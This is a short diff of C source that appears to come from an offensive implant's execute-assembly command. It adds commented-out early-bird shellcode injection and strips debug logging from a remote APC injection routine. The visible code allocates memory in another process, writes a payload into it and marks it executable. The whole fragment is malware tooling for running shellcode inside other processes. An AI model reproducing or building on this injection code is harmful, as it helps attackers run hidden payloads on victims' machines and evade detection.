@@ -5,6 +5,18 @@
 
 #ifdef INCLUDE_CMD_EXECUTE_ASSEMBLY
 
+// #define PROCESS_INJECT_SPAWN 
+
+/* Default: Spawn and Inject the Shellcode */
+// unsigned char* Output = NULL;
+// if (!InjectProcessViaEarlyBird((PBYTE)Shellcode.buffer, Shellcode.size, &Output))
+// {
+//     DWORD error = GetLastError();
+//     _err("[!] Failed to inject process. ERROR : %d\n", error);
+//     return FALSE;
+// }
+
+
 /*
     Helper Functions
 */
@@ -101,14 +113,12 @@ BOOL RunViaRemoteApcInjection(IN HANDLE hThread, IN HANDLE hProc, IN PBYTE pPayl
 		_dbg("\t[!] VirtualAllocEx Failed With Error : %d\n", GetLastError());
 		return FALSE;
 	}
-	_dbg("\t[+] Allocated memory region at : %p\n", pAddress);
 
 	SIZE_T szNumberOfBytesWritten = NULL;
 	if (!WriteProcessMemory(hProc, pAddress, pPayload, szPayloadSize, &szNumberOfBytesWritten) || szNumberOfBytesWritten != szPayloadSize) {
 		_dbg("\t[!] Failed to write process memory : %d\n", GetLastError());
 		return FALSE;
 	}
-	_dbg("\t[+] Copied %d bytes to allocated region.\n", szNumberOfBytesWritten);
 
 	if (!VirtualProtectEx(hProc, pAddress, szPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
 		_dbg("\t[!] VirtualProtect Failed With Error : %d\n", GetLastError());
